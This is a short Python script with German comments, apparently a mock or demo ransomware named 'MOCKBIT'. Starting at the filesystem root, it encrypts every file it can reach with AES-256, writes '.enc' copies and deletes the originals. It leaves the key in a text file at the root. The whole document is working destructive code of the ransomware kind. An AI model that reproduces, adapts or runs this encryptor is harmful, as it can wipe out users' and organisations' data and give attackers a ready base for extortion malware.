import os
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Zielordner anpassen!
START_PATH = "/"
KEY_FILENAME = "MOCKBIT_KEY.txt"

def pad(data):
    pad_length = AES.block_size - (len(data) % AES.block_size)
    return data + bytes([pad_length]) * pad_length

def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data))
    with open(file_path + ".enc", "wb") as f:
        f.write(cipher.iv + ct_bytes)
    os.remove(file_path)

def find_and_encrypt_all_files(path, key):
    for dirpath, _, files in os.walk(path):
        for name in files:
            file_path = os.path.join(dirpath, name)
            if name.endswith(".enc") or name == KEY_FILENAME:
                continue
            try:
                encrypt_file(file_path, key)
                print("Verschlüsselt:", file_path)
            except Exception as e:
                print("Fehler bei", file_path, e)

if __name__ == "__main__":
    key = get_random_bytes(32)  # AES-256
    key_b64 = base64.b64encode(key).decode()
    # Schlüssel in Datei speichern
    key_path = os.path.join(START_PATH, KEY_FILENAME)
    with open(key_path, "w") as f:
        f.write(key_b64)
    print(f"Schlüssel wurde in {key_path} gespeichert. Unbedingt sichern!")
    find_and_encrypt_all_files(START_PATH, key)
    print("Fertig.")
